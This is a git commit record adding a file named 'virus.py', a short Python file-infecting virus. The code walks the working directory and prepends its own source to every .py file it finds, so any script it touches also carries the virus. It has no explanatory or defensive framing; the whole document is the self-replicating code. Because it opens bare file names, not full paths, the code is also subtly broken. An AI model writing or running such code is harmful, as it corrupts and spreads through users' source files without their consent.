94fd31cddd86fdd5a7319a1d1b20e516ae21c382
Administrator <65272329+Administrator859@users.noreply.github.com>
2020-06-03 17:00:40 +0800

    Create virus.py

---
+++ virus.py
@@ -0,0 +1,10 @@
+import os
+for root, dirs, files in os.walk(os.getcwd()):
+	for f in files:
+		if f.endswith('.py'):
+			with open(f, 'r+') as f:
+				target_host_content = f.read()
+				f.seek(0,0)
+				with open(__file__) as virus:
+					virus_content = virus.read()
+					f.write(virus_content + "\n" + target_host_content)
